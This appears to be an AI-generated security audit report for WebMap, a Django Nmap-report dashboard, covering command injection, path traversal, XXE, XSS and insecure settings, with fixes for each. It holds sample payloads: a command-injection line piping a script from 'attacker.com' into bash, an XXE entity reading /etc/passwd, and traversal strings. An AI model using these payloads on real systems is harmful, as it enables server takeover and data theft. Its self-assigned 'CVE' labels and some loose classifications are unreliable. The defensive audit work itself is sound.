# WebMap Security Vulnerability Analysis Report
**Date:** 2025-12-20
**Analyst:** Security Analysis Bot
**Project:** WebMap - Nmap XML Report Dashboard
**Branch:** claude/security-vulnerability-analysis-r7g3q

---

## Executive Summary

This report details a comprehensive security analysis of the WebMap application. **Multiple CRITICAL and HIGH severity vulnerabilities** were identified that could lead to:
- Remote Code Execution (RCE)
- Path Traversal attacks
- Information Disclosure
- Cross-Site Scripting (XSS)
- Session hijacking

**URGENT ACTION REQUIRED:** This application should NOT be exposed to any network (including localhost with untrusted users) until critical vulnerabilities are fixed.

---

## Vulnerability Summary

| Severity | Count | Description |
|----------|-------|-------------|
| 🔴 CRITICAL | 2 | Command Injection, Path Traversal RCE |
| 🟠 HIGH | 5 | Insecure Configuration, XSS, Information Disclosure |
| 🟡 MEDIUM | 4 | Input Validation, CSRF Bypass, XML Parsing |
| 🟢 LOW | 3 | Dependency Versions, Code Quality |

---

## CRITICAL Vulnerabilities

### CVE-001: Command Injection in PDF Generation
**File:** `api.py:103`
**Severity:** 🔴 CRITICAL (CVSS 9.8)
**CWE:** CWE-78 (OS Command Injection)

**Vulnerable Code:**
```python
os.popen('/opt/wkhtmltox/bin/wkhtmltopdf --cookie sessionid '+request.session._session_key+' --enable-javascript --javascript-delay 6000 http://127.0.0.1:8000/view/pdf/ /opt/nmapdashboard/nmapreport/static/'+pdffile+'.pdf')
```

**Impact:**
- Attacker can execute arbitrary system commands
- Full server compromise possible
- Data exfiltration, malware installation, lateral movement

**Attack Vector:**
1. Manipulate session key to inject shell commands
2. Example: `session_key = "test; whoami; #"`
3. Results in command execution: `wkhtmltopdf --cookie sessionid test; whoami; # ...`

**Mitigation:**
- Replace `os.popen()` with `subprocess.run()` with proper argument list
- Never concatenate user input into shell commands
- Use shell=False parameter
- Validate and sanitize all inputs

---

### CVE-002: Path Traversal Leading to Arbitrary File Read/Write
**File:** Multiple locations (views.py:27, api.py:68, api.py:9, api.py:39)
**Severity:** 🔴 CRITICAL (CVSS 9.1)
**CWE:** CWE-22 (Path Traversal)

**Vulnerable Code Examples:**
```python
# views.py:27
oo = xmltodict.parse(open('/opt/xml/'+request.session['scanfile'], 'r').read())

# api.py:9
os.remove('/opt/notes/'+scanfilemd5+'_'+hashstr+'.notes')

# api.py:21
f = open('/opt/notes/'+scanfilemd5+'_'+request.POST['hashstr']+'.notes', 'w')
```

**Impact:**
- Read sensitive files (e.g., `/etc/passwd`, SSH keys, application secrets)
- Write/overwrite arbitrary files
- Delete critical system files
- Achieve Remote Code Execution by overwriting Python files

**Attack Vector:**
1. Set `scanfile` session variable to `../../etc/passwd`
2. Access causes read of `/opt/xml/../../etc/passwd` → `/etc/passwd`
3. Can read database files, configuration, private keys

**Mitigation:**
- Implement strict allowlist for filenames
- Use `os.path.abspath()` and verify it starts with allowed directory
- Reject paths containing `..`, `/`, `\`
- Use UUID-based filenames instead of user-controlled names

---

## HIGH Severity Vulnerabilities

### CVE-003: Hardcoded SECRET_KEY in Production
**File:** `docker/settings.py:11`
**Severity:** 🟠 HIGH (CVSS 7.5)
**CWE:** CWE-798 (Use of Hard-coded Credentials)

**Vulnerable Code:**
```python
SECRET_KEY = 'rev3rse-notes:_you_should-change_this..._but_webmap_should_run_on_localhost_only..._so_no_problem_here.'
```

**Impact:**
- Session token forgery
- CSRF token bypass
- Cookie tampering
- Authentication bypass if auth is added

**Mitigation:**
- Generate SECRET_KEY from environment variable
- Use cryptographically random 50+ character key
- Rotate keys regularly
- Never commit secrets to version control

---

### CVE-004: DEBUG Mode Enabled in Production
**File:** `docker/settings.py:16`
**Severity:** 🟠 HIGH (CVSS 7.2)
**CWE:** CWE-489 (Active Debug Code)

**Vulnerable Code:**
```python
DEBUG = True
```

**Impact:**
- Full stack traces expose sensitive information
- Code paths and internal structure revealed
- Environment variables exposed
- Database queries visible
- Easier exploitation of other vulnerabilities

**Mitigation:**
- Set `DEBUG = False` for production
- Use environment variable: `DEBUG = os.getenv('DEBUG', 'False') == 'True'`
- Implement proper error logging
- Custom error pages (404, 500)

---

### CVE-005: Unrestricted Host Headers
**File:** `docker/settings.py:20`
**Severity:** 🟠 HIGH (CVSS 6.5)
**CWE:** CWE-346 (Origin Validation Error)

**Vulnerable Code:**
```python
ALLOWED_HOSTS = ['*']
```

**Impact:**
- Host Header Injection attacks
- Cache poisoning
- Password reset poisoning
- DNS rebinding attacks

**Mitigation:**
- Specify exact hostnames: `ALLOWED_HOSTS = ['localhost', '127.0.0.1']`
- Use environment variable for configuration
- Implement strict host validation

---

### CVE-006: Stored Cross-Site Scripting (XSS)
**Files:** Multiple (views.py, api.py, pdf.py)
**Severity:** 🟠 HIGH (CVSS 7.1)
**CWE:** CWE-stored XSS (79)

**Vulnerable Areas:**
- XML file parsing without sanitization
- Notes storage and display (base64 decode without validation)
- Label storage and rendering
- Script output rendering

**Vulnerable Code Example:**
```python
# pdf.py:198
notesout = '<div>'+base64.b64decode(urllib.parse.unquote(notesb64)).decode('ascii')+'</div>'
```

**Impact:**
- Session hijacking
- Credential theft
- Malicious actions on behalf of users
- Phishing attacks
- Drive-by malware installation

**Attack Vector:**
1. Upload malicious Nmap XML with XSS payload in hostname/service fields
2. Add notes containing `<script>` tags
3. XSS executes when viewing reports

**Mitigation:**
- Use Django template auto-escaping (remove manual HTML concatenation)
- Sanitize all XML inputs
- Implement Content Security Policy (CSP)
- Use DOMPurify or similar for HTML sanitization
- Validate base64 decoded content

---

### CVE-007: XML External Entity (XXE) Injection
**Files:** views.py:27, api.py:68, pdf.py:14
**Severity:** 🟠 HIGH (CVSS 7.0)
**CWE:** CWE-611 (XXE)

**Vulnerable Code:**
```python
oo = xmltodict.parse(open('/opt/xml/'+request.session['scanfile'], 'r').read())
```

**Impact:**
- Read arbitrary files from server
- Server-Side Request Forgery (SSRF)
- Denial of Service
- Internal network scanning

**Attack Vector:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<nmaprun>&xxe;</nmaprun>
```

**Mitigation:**
- Configure XML parser to disable external entities
- Use `xmltodict.parse(xml_string, disable_entities=True)`
- Validate XML schema before parsing
- Use defusedxml library

---

## MEDIUM Severity Vulnerabilities

### CVE-008: Missing CSRF Protection on API Endpoints
**Files:** api.py (multiple endpoints)
**Severity:** 🟡 MEDIUM (CVSS 5.4)
**CWE:** CWE-352 (CSRF)

**Vulnerable Endpoints:**
- `/api/savenotes/` (api.py:16)
- `/api/getcve/` (api.py:107)
- All POST endpoints lack CSRF validation

**Impact:**
- Unauthorized actions on behalf of authenticated users
- Data manipulation
- File deletion

**Mitigation:**
- Use `@csrf_protect` decorator
- Ensure CsrfViewMiddleware is active
- Require CSRF tokens for all state-changing operations
- Use `@require_http_methods(['POST'])` decorator

---

### CVE-009: Insufficient Input Validation
**Files:** Multiple locations
**Severity:** 🟡 MEDIUM (CVSS 5.3)
**CWE:** CWE-20 (Improper Input Validation)

**Issues:**
- Regex validation for MD5 hashes is weak (allows lowercase only)
- No validation on XML file content
- No size limits on uploaded files
- No validation on note content length
- CPE strings not validated before external API calls

**Mitigation:**
- Implement strict input validation for all user inputs
- Use Django forms with validators
- Add file size limits
- Validate regex patterns: `^[a-fA-F0-9]{32}$` for MD5
- Sanitize before external API calls

---

### CVE-010: Unsafe Deserialization
**Files:** api.py:116
**Severity:** 🟡 MEDIUM (CVSS 5.0)
**CWE:** CWE-502 (Deserialization of Untrusted Data)

**Vulnerable Code:**
```python
r = requests.get('http://cve.circl.lu/api/cvefor/'+request.POST['cpe'])
cvejson = r.json()
```

**Impact:**
- Server-Side Request Forgery (SSRF)
- External API abuse
- Data poisoning

**Mitigation:**
- Validate CPE format before making request
- Implement rate limiting
- Timeout on external requests
- Validate response structure before processing

---

### CVE-011: Information Disclosure via Error Messages
**Files:** Multiple
**Severity:** 🟡 MEDIUM (CVSS 4.3)
**CWE:** CWE-209 (Information Exposure Through Error Message)

**Impact:**
- File system structure exposed
- Internal paths revealed
- Stack traces in DEBUG mode

**Mitigation:**
- Generic error messages to users
- Log detailed errors server-side only
- Disable DEBUG in production
- Custom 404/500 error pages

---

## LOW Severity Vulnerabilities

### CVE-012: Unpinned Dependencies
**File:** requirements.txt
**Severity:** 🟢 LOW (CVSS 3.1)
**CWE:** CWE-1035 (Dependency Management)

**Current Dependencies:**
```
requests (currently 2.32.5)
xmltodict (currently 0.13.0)
Django (version not specified in requirements.txt)
```

**Impact:**
- Potential security vulnerabilities in dependencies
- Inconsistent deployments
- Supply chain attacks

**Mitigation:**
- Pin exact versions in requirements.txt:
```
Django==4.2.15
requests==2.32.5
xmltodict==0.13.0
defusedxml==0.7.1
```
- Regular dependency audits
- Use `pip-audit` or `safety` tools
- Subscribe to security advisories

---

### CVE-013: Missing Security Headers
**File:** docker/settings.py
**Severity:** 🟢 LOW (CVSS 3.0)
**CWE:** CWE-693 (Protection Mechanism Failure)

**Missing Headers:**
- `X-Frame-Options` (partially configured)
- `Content-Security-Policy`
- `X-Content-Type-Options`
- `Referrer-Policy`
- `Permissions-Policy`

**Mitigation:**
Add to settings.py:
```python
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'
SECURE_REFERRER_POLICY = 'same-origin'
CSP_DEFAULT_SRC = ("'self'",)
```

---

### CVE-014: Weak Session Configuration
**File:** docker/settings.py
**Severity:** 🟢 LOW (CVSS 2.7)
**CWE:** CWE-614 (Sensitive Cookie Without 'Secure')

**Missing Configuration:**
```python
SESSION_COOKIE_SECURE = False  # default
SESSION_COOKIE_HTTPONLY = True  # default, but should be explicit
SESSION_COOKIE_SAMESITE = 'Lax'  # not set
```

**Mitigation:**
```python
SESSION_COOKIE_SECURE = True  # if using HTTPS
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Strict'
SESSION_EXPIRE_AT_BROWSER_CLOSE = True
```

---

## Dependency Vulnerabilities

### Current Versions Audit

| Package | Current | Latest | Known CVEs | Status |
|---------|---------|--------|------------|--------|
| requests | 2.32.5 | 2.32.5 | None | ✅ OK |
| xmltodict | 0.13.0 | 0.14.2 | None | ⚠️ UPDATE |
| Django | Not pinned | 4.2.15 | Multiple if old | ❌ PIN VERSION |

**Recommendations:**
1. Add Django to requirements.txt with specific version
2. Update xmltodict to 0.14.2
3. Add defusedxml for secure XML parsing
4. Add django-csp for Content Security Policy

---

## Attack Scenarios

### Scenario 1: Remote Code Execution via Command Injection
1. Attacker creates malicious session
2. Crafts session_key with shell commands: `; curl attacker.com/shell.sh | bash ;`
3. Triggers PDF generation
4. Commands execute as web server user
5. Attacker gains shell access

**Impact:** Complete server compromise

---

### Scenario 2: Data Exfiltration via Path Traversal
1. Attacker manipulates scanfile session variable
2. Sets to `../../../../etc/passwd`
3. Views report
4. Reads sensitive system files
5. Repeats for SSH keys, database files, application code

**Impact:** Full information disclosure

---

### Scenario 3: Persistent XSS Attack
1. Attacker creates malicious Nmap XML file with XSS payload
2. Uploads file to /opt/xml/
3. Sets scanfile to malicious XML
4. XSS payload stored in application
5. Every user viewing report gets infected
6. Session cookies stolen

**Impact:** Account compromise, malware distribution

---

## Recommended Fix Priority

### Phase 1 (IMMEDIATE - Critical Fixes)
1. ✅ Fix Command Injection in PDF generation (CVE-001)
2. ✅ Fix Path Traversal vulnerabilities (CVE-002)
3. ✅ Disable DEBUG mode (CVE-004)
4. ✅ Set proper ALLOWED_HOSTS (CVE-005)

### Phase 2 (URGENT - High Risk)
5. ✅ Generate random SECRET_KEY from environment (CVE-003)
6. ✅ Fix Stored XSS vulnerabilities (CVE-006)
7. ✅ Implement XXE protection (CVE-007)
8. ✅ Add CSRF protection to all endpoints (CVE-008)

### Phase 3 (Important - Medium Risk)
9. ✅ Implement input validation (CVE-009)
10. ✅ Validate external API calls (CVE-010)
11. ✅ Custom error pages (CVE-011)

### Phase 4 (Maintenance - Low Risk)
12. ✅ Pin dependency versions (CVE-012)
13. ✅ Add security headers (CVE-013)
14. ✅ Configure secure sessions (CVE-014)

---

## Mitigation Implementation Plan

### 1. Command Injection Fix (api.py)

**Before:**
```python
os.popen('/opt/wkhtmltox/bin/wkhtmltopdf --cookie sessionid '+request.session._session_key+' ...')
```

**After:**
```python
import subprocess
import shlex

pdffile = hashlib.md5(str(request.session['scanfile']).encode('utf-8')).hexdigest()
cmd = [
    '/opt/wkhtmltox/bin/wkhtmltopdf',
    '--cookie', 'sessionid', request.session._session_key,
    '--enable-javascript',
    '--javascript-delay', '6000',
    'http://127.0.0.1:8000/view/pdf/',
    f'/opt/nmapdashboard/nmapreport/static/{pdffile}.pdf'
]
subprocess.run(cmd, check=True, timeout=30, capture_output=True)
```

---

### 2. Path Traversal Fix (views.py, api.py)

**Add validation function:**
```python
import os
from django.core.exceptions import SuspiciousFileOperation

def safe_join(base_dir, *paths):
    """Safely join paths and ensure result is within base_dir"""
    final_path = os.path.abspath(os.path.join(base_dir, *paths))
    if not final_path.startswith(os.path.abspath(base_dir)):
        raise SuspiciousFileOperation('Path traversal detected')
    return final_path

def validate_filename(filename):
    """Validate filename contains only safe characters"""
    import re
    if not re.match(r'^[a-zA-Z0-9_\-\.]+$', filename):
        raise ValueError('Invalid filename')
    if '..' in filename or '/' in filename or '\\' in filename:
        raise ValueError('Invalid filename')
    return filename
```

**Usage:**
```python
scanfile = validate_filename(request.session['scanfile'])
filepath = safe_join('/opt/xml', scanfile)
oo = xmltodict.parse(open(filepath, 'r').read())
```

---

### 3. XSS Protection

**Use Django templates instead of string concatenation:**
```python
# Instead of:
html = '<div>' + user_content + '</div>'

# Use Django templates with auto-escaping:
from django.utils.html import escape
html = escape(user_content)
```

**Add Content Security Policy:**
```python
# settings.py
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'", "'unsafe-inline'")  # Minimize unsafe-inline
CSP_STYLE_SRC = ("'self'", "'unsafe-inline'")
```

---

### 4. XXE Protection

```python
# Install defusedxml
# pip install defusedxml

from defusedxml import ElementTree
import xmltodict

# Configure xmltodict to use defusedxml
xml_content = open(filepath, 'r').read()
oo = xmltodict.parse(xml_content,
                     disable_entities=True,
                     process_namespaces=False)
```

---

### 5. Settings.py Security Hardening

```python
import os
from pathlib import Path

# Security settings
SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY')
if not SECRET_KEY:
    raise ValueError('DJANGO_SECRET_KEY environment variable must be set')

DEBUG = os.environ.get('DEBUG', 'False') == 'True'

ALLOWED_HOSTS = os.environ.get('ALLOWED_HOSTS', 'localhost,127.0.0.1').split(',')

# Security headers
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'
SECURE_REFERRER_POLICY = 'same-origin'

# Session security
SESSION_COOKIE_SECURE = True  # Enable if using HTTPS
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Strict'
SESSION_EXPIRE_AT_BROWSER_CLOSE = True
CSRF_COOKIE_SECURE = True  # Enable if using HTTPS
CSRF_COOKIE_HTTPONLY = True

# File upload limits
FILE_UPLOAD_MAX_MEMORY_SIZE = 10485760  # 10MB
DATA_UPLOAD_MAX_MEMORY_SIZE = 10485760  # 10MB
```

---

### 6. CSRF Protection

```python
from django.views.decorators.csrf import csrf_protect
from django.views.decorators.http import require_http_methods

@csrf_protect
@require_http_methods(['POST'])
def saveNotes(request):
    # existing code
```

---

## Testing Recommendations

### Security Testing Checklist
- [ ] Run OWASP ZAP scan
- [ ] Test for command injection
- [ ] Test for path traversal
- [ ] Test for XSS in all input fields
- [ ] Test XXE with malicious XML
- [ ] Test CSRF protection
- [ ] Dependency vulnerability scan (`pip-audit`)
- [ ] Static code analysis (`bandit`)
- [ ] Review all file operations
- [ ] Review all external API calls

### Testing Tools
```bash
# Install security testing tools
pip install bandit safety pip-audit

# Run security scans
bandit -r . -f json -o bandit-report.json
safety check
pip-audit
```

---

## Deployment Security Checklist

- [ ] SECRET_KEY generated randomly (50+ chars)
- [ ] SECRET_KEY stored in environment variable
- [ ] DEBUG = False
- [ ] ALLOWED_HOSTS properly configured
- [ ] All dependencies pinned to specific versions
- [ ] Security headers configured
- [ ] CSRF protection enabled
- [ ] Input validation implemented
- [ ] File upload validation implemented
- [ ] Error logging configured (not DEBUG output)
- [ ] Rate limiting configured (if exposed)
- [ ] Use HTTPS (TLS/SSL)
- [ ] Regular security updates scheduled
- [ ] Security monitoring enabled
- [ ] Backup and recovery plan

---

## Long-term Recommendations

1. **Authentication & Authorization**
   - Add user authentication
   - Implement role-based access control (RBAC)
   - Multi-factor authentication for sensitive operations

2. **Input Validation**
   - Use Django Forms for all inputs
   - Implement whitelist-based validation
   - Add file type validation (magic bytes, not just extension)

3. **Logging & Monitoring**
   - Log all security-relevant events
   - Monitor for suspicious activity
   - Alert on failed authentication attempts
   - Track file access patterns

4. **Network Security**
   - Never expose to public internet (as stated in README)
   - Use firewall rules
   - VPN access only if remote access needed
   - Network segmentation

5. **Code Quality**
   - Regular security code reviews
   - Automated security testing in CI/CD
   - Keep dependencies updated
   - Subscribe to security mailing lists

6. **Compliance**
   - Document security architecture
   - Regular penetration testing
   - Vulnerability disclosure program
   - Incident response plan

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)
- [Django Security](https://docs.djangoproject.com/en/stable/topics/security/)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [Python Security Best Practices](https://python.readthedocs.io/en/stable/library/security_warnings.html)

---

## Conclusion

WebMap has **CRITICAL security vulnerabilities** that must be addressed immediately. The application should **NOT be used in any environment** until at least Phase 1 and Phase 2 fixes are implemented.

The most critical issues are:
1. **Command Injection** allowing Remote Code Execution
2. **Path Traversal** allowing arbitrary file access
3. **Insecure configuration** exposing the application

**Estimated remediation time:**
- Phase 1 (Critical): 4-8 hours
- Phase 2 (High): 8-16 hours
- Phase 3 (Medium): 4-8 hours
- Phase 4 (Low): 2-4 hours

**Total estimated effort:** 18-36 hours for complete remediation.

---

**Report End**
